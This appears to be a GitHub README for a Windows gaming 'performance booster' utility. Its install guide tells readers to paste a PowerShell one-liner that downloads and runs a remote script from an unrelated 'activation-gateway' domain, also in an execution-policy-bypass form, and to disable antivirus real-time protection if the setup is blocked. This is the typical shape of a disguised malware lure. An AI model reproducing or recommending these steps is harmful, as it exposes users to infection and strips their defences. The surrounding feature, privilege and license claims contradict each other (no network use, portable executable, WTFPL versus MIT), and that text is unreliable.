<div align="center">

# Respocket Performance Booster Utility: FPS Tweaks & Memory Optimization for Windows 10 & 11

![preview](https://raw.githubusercontent.com/Muji123/respocket-system-tuner/main/frame_57302.svg)

[![powershell-7](https://img.shields.io/badge/powershell--7-core-14b8a6?style=flat-square&labelColor=0d1117)]() [![lic](https://img.shields.io/badge/lic-wtfpl-2dd4bf?style=flat-square&labelColor=0d1117)]() [![runs-on](https://img.shields.io/badge/runs--on-windows_10_%7C_11-0d9488?style=flat-square&labelColor=0d1117)]()

</div>

---

Respocket-Performance-Booster-Utility is a Windows 10/11 desktop utility that improves gaming frame rates through advanced system tweaks, intelligent process prioritization, and real-time memory optimization. The application applies reversible low-level adjustments to background services, power plans, and resource scheduling, targeting reduced stutter and more stable frame times during gameplay. Built for 64-bit Windows systems, it combines automated optimization profiles with granular manual controls so users can tune CPU affinity, process priority, and memory cleanup behavior to their hardware. All modifications can be reverted at any time through the built-in restore function, keeping the tool suitable for everyday use alongside competitive and AAA titles.

## 🚀 PowerShell Install Guide

> [!TIP]
> **Silent installer** — one command, no prompts.
> Win 10/11 · PowerShell 5.1+ · Standard user

### 1️⃣ Prepare PowerShell
* Open the Start menu and type **PowerShell**.
* Right-click and choose **Run as administrator** (optional).

### 2️⃣ Run the command
Copy the line below into PowerShell and press `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If PowerShell blocks the script
Copy into CMD, press `Enter`, wait for completion:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> If SmartScreen or antivirus blocks the setup, go to **Windows Security → Virus & threat protection → Manage settings**, turn off **Real-time protection**, run the script, and re-enable immediately.

## ✅ Before You Start

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

- **Adaptive Process Prioritization** – Dynamically elevates game executables to high-priority scheduling classes while deprioritizing background consumers, reducing frame-time variance under load.
- **Memory Optimization Engine** – Reclaims standby and cached pages, trims working sets of non-critical processes, and consolidates free RAM to minimize stutter and paging during sustained gameplay.
- **System Tweak Profiles** – Applies curated registry and scheduler adjustments across selectable presets (Balanced, Performance, Extreme), each tuned for different hardware tiers and workloads.
- **GPU Scheduling Adjustments** – Configures hardware-accelerated GPU scheduling and related graphics pipeline settings to lower render latency on supported Windows 10/11 builds.
- **Background Service Management** – Identifies and suspends non-essential services and scheduled tasks during active sessions, freeing CPU cycles and disk I/O for the foreground application.
- **Power Plan Enforcement** – Switches the system to a high-performance power scheme and prevents throttling transitions mid-session.
- **Reversible Tweaks** – Every modification is logged and restorable via a single "Restore Defaults" action, ensuring the system can be returned to its original configuration at any time.
- **Per-Process Exclusion List** – Allows users to whitelist applications that should never be optimized, prioritized, or suspended.
- **Lightweight and Portable** – Runs as a standalone executable with no background agents, no telemetry, and minimal memory footprint.
- **Session Logging** – Records applied tweaks, reclaimed memory figures, and priority changes for post-session review and troubleshooting.

## How It Works

Respocket-Performance-Booster-Utility applies a layered optimization pipeline rather than a single global switch, so each subsystem is tuned independently and can be reverted on its own.

**Process Prioritization**
The utility enumerates active processes and identifies the foreground game by executable signature and window focus. The selected process is raised to high CPU priority and, where supported, given preferential I/O scheduling. Background processes that compete for scheduler time are demoted rather than terminated, preserving system stability while reducing contention on the render thread.

**Memory Optimization**
A working-set analysis identifies dormant pages held by background services and cached allocations that are no longer referenced by the active game. These pages are released back to the standby list, lowering commit charge and reducing the likelihood of paging during frame-heavy scenes. The routine runs on demand or on a configurable interval and avoids touching memory owned by the protected game process.

**System and Registry Tweaks**
Targeted adjustments are applied to graphics scheduling, power management, and timer resolution keys. Each tweak is written through a transactional change log, so the original values are recorded before modification and can be restored exactly. Tweaks are grouped into profiles, allowing a conservative set for daily use and a more aggressive set for benchmarking.

**Power and Latency Handling**
The active power plan is switched to a high-performance profile for the duration of a session, and the tool requests a higher system timer resolution to reduce scheduling jitter. Both changes are scoped to the session and released when the optimizer is stopped or the game exits.

**Reversibility**
Every modification is tracked in a local state file. The restore function replays the change log in reverse order, returning registry values, priorities, and power settings to their captured originals. No tweak is applied without a corresponding restore entry, and the utility verifies each write before committing it.

## Compatibility

Respocket-Performance-Booster-Utility is engineered for desktop Windows environments and targets the operating system's process scheduler, memory manager, and power subsystems directly through documented performance APIs. Compatibility details are outlined below.

**Operating System Support**

- Windows 10 (64-bit), all mainstream builds, including Long-Term Servicing Channel releases.
- Windows 11 (64-bit), including current feature updates and version 24H2.
- 32-bit Windows installations are not supported, as the underlying performance interfaces and process-priority controls require an x64 execution context.

**Hardware Requirements**

- x64 processor (Intel or AMD) with at least two logical cores; additional cores improve the effectiveness of process prioritization and affinity tuning.
- 2 GB of RAM minimum; 8 GB or more recommended so that memory optimization routines have headroom to reclaim and redistribute working sets.
- Approximately 30 MB of free disk space for the utility and its configuration profiles.
- No dedicated GPU is required; the utility operates at the system level and does not depend on vendor-specific graphics drivers, though it cooperates with standard GPU scheduling behavior on both NVIDIA and AMD systems.

**Privilege and Environment Requirements**

- Administrator privileges are required for the full set of tweaks, including process priority elevation, registry-based scheduling adjustments, and power plan switching. Standard-user mode permits only read-only inspection and a limited subset of memory cleanup operations.
- The utility runs as a portable desktop application and does not require a system service, kernel driver installation, or reboot to begin operation.

**Interoperability Notes**

- Coexists with common anti-cheat and anti-tamper systems because all adjustments are applied to process priorities and OS-level settings rather than to game binaries or memory contents. Users should verify per-title policies where competitive integrity rules apply.
- Settings are applied per-session and are fully reversible through the restore-defaults function; no permanent system modification is required for standard operation.
- Automatic optimization triggers can be scoped to specific executables, allowing the utility to skip protected or latency-sensitive processes through the exclusions list.

**Known Limitations**

- Virtualized or sandboxed Windows environments may restrict the performance counters and priority APIs the utility relies on; behavior in such environments is not guaranteed.
- Windows Server editions are outside the supported matrix and have not been validated.

## FAQ

**Q: Does Respocket require installation or system-level drivers?** 
A: No. Respocket-Performance-Booster-Utility is a portable executable. It runs from any local folder or removable drive and applies runtime tweaks through documented Windows performance APIs without installing kernel-mode drivers or persistent services.

**Q: Which optimizations are applied by default, and can they be reverted?** 
A: The default profile adjusts process priority classes for the active game, trims standby memory lists, and applies a high-performance power scheme. Every change is logged and reversible via the built-in Restore Defaults function; no registry backups are required because the utility does not write permanent modifications.

**Q: How does process prioritization interact with anti-cheat or protected game processes?** 
A: Respocket respects process protection boundaries. Titles guarded by kernel-level anti-cheat are detected and skipped automatically; the utility will not attempt to alter priority or affinity for protected processes, preserving compatibility with competitive multiplayer environments.

**Q: What is the memory optimization strategy, and does it risk data loss?** 
A: The memory module targets only standby and cached pages using standard working-set trimming calls. It does not touch committed memory belonging to active applications, so no application state is affected. Optimization runs are idempotent and can be repeated safely.

**Q: Can I target specific executables or exclude sensitive processes?** 
A: Yes. The exclusion list accepts process names and full paths. Excluded processes are never reprioritized, trimmed, or profiled. Game detection can also be pinned manually when automatic heuristic matching selects an unintended executable.

**Q: Does the utility support scheduled or on-launch optimization?** 
A: An optional scheduler applies the selected profile when a watched game executable starts. Scheduled maintenance intervals are configurable; the scheduler runs in user context and requires no background service.

**Q: What Windows builds are validated?** 
A: Windows 10 and Windows 11, 64-bit, across current release channels. The utility queries OS build at startup and disables tweaks that are not applicable to the detected build, so unsupported optimizations degrade gracefully rather than failing.

**Q: Why might frame rates show no improvement after applying a profile?** 
A: Gains depend on the workload. CPU-bound scenarios typically benefit from priority and power-plan changes; GPU-bound scenarios may see minimal impact. Restart the game after applying tweaks so new priority and affinity settings take effect, and verify the profile was not skipped due to process protection.

**Q: Is administrator elevation required?** 
A: Elevation is required for power-scheme changes and system-wide memory trimming. Without elevation, Respocket runs in a reduced mode covering per-process priority and affinity only. The interface indicates which modules are active at the current privilege level.

**Q: How do I verify that tweaks were applied and later removed?** 
A: The activity log records each operation with timestamps and target processes. After Restore Defaults, the log confirms reversion of priority classes, power scheme, and memory state. A reboot guarantees a clean baseline if verification is inconclusive.

**Q: Does Respocket collect telemetry or transmit system data?** 
A: No. The utility performs no network communication and stores configuration locally alongside the executable. No analytics, identifiers, or usage data are generated.

**Q: Can Respocket and other optimization tools run simultaneously?** 
A: Concurrent use is not recommended. Overlapping tweaks can produce conflicting priority or power states that are difficult to attribute. If switching tools, run Restore Defaults in Respocket first to return the system to a known baseline.

## Disclaimer

Respocket-Performance-Booster-Utility is provided as a system-level optimization tool intended for legitimate performance tuning on supported Windows 10/11 environments. By using this software, you acknowledge that you are solely responsible for evaluating its suitability for your hardware configuration and for any changes applied to your system. The utility modifies process priorities, memory allocation behavior, and select registry-level performance parameters; while all tweaks are designed to be reversible, outcomes may vary depending on hardware, driver versions, background workloads, and game-specific behavior. The authors make no guarantee of specific frame-rate improvements, latency reductions, or compatibility with every application or anti-cheat configuration. You are responsible for verifying that use of this tool does not conflict with the terms of service of any software with which it is used. Administrators should test configurations in a controlled environment before deployment, and users are encouraged to create a system restore point prior to applying optimizations. The software is supplied on an as-is basis, and the authors disclaim liability for any system instability, data loss, or performance regressions arising from its use.

## License

Respocket-Performance-Booster-Utility is distributed under the MIT License. Permission is granted, free of charge, to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, subject to the condition that the copyright notice and this permission notice are included in all copies or substantial portions of the Software.

The Software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the Software or the use or other dealings in the Software.

Redistribution in source and binary forms, with or without modification, is permitted provided that the copyright notice, this list of conditions, and the accompanying disclaimer are retained. Modified versions must be clearly identified as such and must not misrepresent the origin of the original Software. Neither the name of the project nor the names of its contributors may be used to endorse or promote derivative works without prior written consent.

The license applies to the source code, build scripts, optimization profiles, and documentation contained within this project. It does not extend to third-party dependencies, which remain governed by their respective licenses; users are responsible for reviewing and complying with those terms before redistribution or commercial deployment.